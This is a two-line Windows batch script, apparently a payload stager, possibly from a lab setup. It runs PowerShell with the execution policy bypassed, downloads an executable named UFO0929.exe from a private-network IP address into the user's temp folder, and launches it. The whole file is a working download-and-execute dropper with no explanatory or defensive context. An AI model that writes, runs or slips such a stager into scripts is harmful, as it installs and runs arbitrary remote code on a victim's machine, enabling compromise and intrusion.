@echo off
C:\Windows\System32\cmd.exe /c powershell.exe -executionpolicy bypass -command (New-object System.Net.WebClient).DownloadFile('http://192.168.211.129/UFO0929.exe', $env:Temp + '\UFO0929.exe'); Invoke-Item "$env:Temp\UFO0929.exe"
